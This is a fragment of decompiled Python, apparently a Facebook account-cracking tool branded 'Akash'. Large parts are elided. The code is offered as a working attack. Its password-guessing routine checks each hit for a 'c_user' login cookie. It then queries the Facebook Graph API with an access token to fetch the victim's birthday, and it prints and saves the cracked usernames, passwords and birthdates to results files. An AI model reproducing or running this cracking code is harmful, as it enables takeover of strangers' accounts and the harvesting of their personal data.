...
# Time Succes decompile : 2022-07-31 00:00:23.370028
...
def hasil(ok,Ok):
    ...
    if len(ok) != 0 or len(Ok) != 0:
        ...
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Akash Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))

        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))

        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(H,H,H,str(len(Ok)),H))

        cek_Ok = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show Ok detector options [{H}Y{N}/{M}t{N}]: ")

        if cek_Ok =="":

            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,Ok)
            ...
            if ww in ("Y","y","ya"):
                ...
                print(f" {N}[{H}•{N}] Password example : {H}Akash123{N}")
            ...
            for memek in Ok:
                ...
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[Akash-Ok] ", "")}{N}')

                try:

                    log_hasil(titid[0].replace("[Akash-Ok] ", ""), titid[1])
...
class __chigoue__:
 ...
 #PROSES CRACK METODE 3 in 1
    ...
    def __metode__(self, cebok, user, pasw):
        ...
        animasi = random.choice(["\x1b[1;92m[Akash]","\x1b[1;92m[Akash]","\x1b[1;92m[Akash]","\x1b[1;92m[Akash]","\x1b[1;92m[Akash]","\x1b[1;92m[Akash]","\x1b[1;92m[Akash]"])

        sys.stdout.write(f"\r{N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}Ok:{len(Ok)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
               ...
               # ua2 = random.choice(agen2)
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        Ok_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']

                        month, day, year = Ok_ttl.split('/')

                        month = bulan_ttl[month]

                        print('\r%sOk %s               \n└─── Username : %s\n  └── Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))

                        wrt = '[Akash-Ok] %s • %s • %s %s %s' % (user,pw,day,month,year)
    ...
    def kombinasi_pw(self,url):
        ...
        if pw in[""]:
            ...
            print('%s[%s+%s] Ok : results/Ok-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
